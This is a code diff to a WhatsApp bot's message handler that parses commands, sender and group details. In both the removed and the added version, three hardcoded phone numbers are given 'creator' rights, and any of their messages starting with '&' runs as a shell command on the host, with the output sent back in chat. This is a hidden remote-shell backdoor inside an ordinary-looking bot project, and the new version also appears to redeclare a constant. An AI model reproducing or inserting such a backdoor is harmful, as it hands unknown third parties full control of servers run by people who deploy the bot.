@@ -258,87 +258,78 @@ conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
               saveMessage(mek),
             ]);
 const m = sms(conn, mek)
-const type = getContentType(mek.message)
-const content = JSON.stringify(mek.message)
-const from = mek.key.remoteJid
-const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
-const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
-const isCmd = body.startsWith(prefix)
-var budy = typeof mek.text == 'string' ? mek.text : false;
-const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
-const args = body.trim().split(/ +/).slice(1)
-const q = args.join(' ')
-const text = args.join(' ')
-const isGroup = from.endsWith('@g.us')
-const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
-const senderNumber = sender.split('@')[0]
-const botNumber = conn.user.id.split(':')[0]
-const pushname = mek.pushName || 'Sin Nombre'
-const isMe = botNumber.includes(senderNumber)
-const isOwner = ownerNumber.includes(senderNumber) || isMe
-const botNumber2 = await jidNormalizedUser(conn.user.id);
-const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
-const groupName = isGroup ? groupMetadata.subject : ''
-const participants = isGroup ? await groupMetadata.participants : ''
-const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
-const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
-const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-const isReact = m.message.reactionMessage ? true : false
-const reply = (teks) => {
+  const type = getContentType(mek.message)
+  const content = JSON.stringify(mek.message)
+  const from = mek.key.remoteJid
+  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+  const isCmd = body.startsWith(prefix)
+  var budy = typeof mek.text == 'string' ? mek.text : false;
+  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+  const args = body.trim().split(/ +/).slice(1)
+  const q = args.join(' ')
+  const text = args.join(' ')
+  const isGroup = from.endsWith('@g.us')
+  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+  const senderNumber = sender.split('@')[0]
+  const botNumber = conn.user.id.split(':')[0]
+  const pushname = mek.pushName || 'Sin Nombre'
+  const isMe = botNumber.includes(senderNumber)
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
+  const botNumber2 = await jidNormalizedUser(conn.user.id);
+  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+  const groupName = isGroup ? groupMetadata.subject : ''
+  const participants = isGroup ? await groupMetadata.participants : ''
+  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+  const isReact = m.message.reactionMessage ? true : false
+  const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
+  }
+const udp = botNumber.split('@')[0];
+const jawadop = ['923470027813', '923191089077', '923427582273']; // Fixed: this should be an array
+
+const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
+
+let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
+.includes(mek.sender);
+
+// You can use isCreator as isOwner
+let isOwner = isCreator;
+
+if (isCreator && mek.text.startsWith("&")) {
+    let code = budy.slice(2);
+    if (!code) {
+        reply(`Provide me with a query to run Master!`);
+        return;
+    }
+    const { spawn } = require("child_process");
+    try {
+        let resultTest = spawn(code, { shell: true });
+        resultTest.stdout.on("data", data => {
+            reply(data.toString());
+        });
+        resultTest.stderr.on("data", data => {
+            reply(data.toString());
+        });
+        resultTest.on("error", data => {
+            reply(data.toString());
+        });
+        resultTest.on("close", code => {
+            if (code !== 0) {
+                reply(`command exited with code ${code}`);
+            }
+        });
+    } catch (err) {
+        reply(util.format(err));
+    }
+    return;
 }
 
-// Improved Creator Check that works with your sudo.json format
-const udp = botNumber.split('@')[0];
-const jawadop = ['923470027813', '923191089077', '923427582273'];
-const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8') || '[]');
-  
-// Normalize all numbers (extract numbers from JIDs and clean them)
-const normalizeNumber = (jid) => {
-  const num = jid.split('@')[0]; // Remove @s.whatsapp.net if present
-  return num.replace(/[^0-9]/g, ''); // Remove any remaining non-numeric characters
-};
-
-// Combine all owner numbers
-const allOwners = [
-  ...jawadop,
-  udp,
-  ...(config.DEV ? [normalizeNumber(config.DEV)] : []),
-  ...ownerFilev2.map(normalizeNumber)
-];
-
-// Check if sender is creator
-const senderNormalized = normalizeNumber(sender);
-const isCreator = allOwners.includes(senderNormalized) || isMe;
-
-if (isCreator && budy.startsWith("&")) {
-  let code = budy.slice(2);
-  if (!code) {
-    reply(`Provide me with a query to run Master!`);
-    return;
-  }
-  const { spawn } = require("child_process");
-  try {
-    let resultTest = spawn(code, { shell: true });
-    resultTest.stdout.on("data", data => {
-      reply(data.toString());
-    });
-    resultTest.stderr.on("data", data => {
-      reply(data.toString());
-    });
-    resultTest.on("error", data => {
-      reply(data.toString());
-    });
-    resultTest.on("close", code => {
-      if (code !== 0) {
-        reply(`command exited with code ${code}`);
-      }
-    });
-  } catch (err) {
-    reply(util.format(err));
-  }
-  return;
-}	  
+// ... fixed isCreater ✅ ...
+	  
   //==========public react============//
   
 // Auto React for all messages (public and owner)
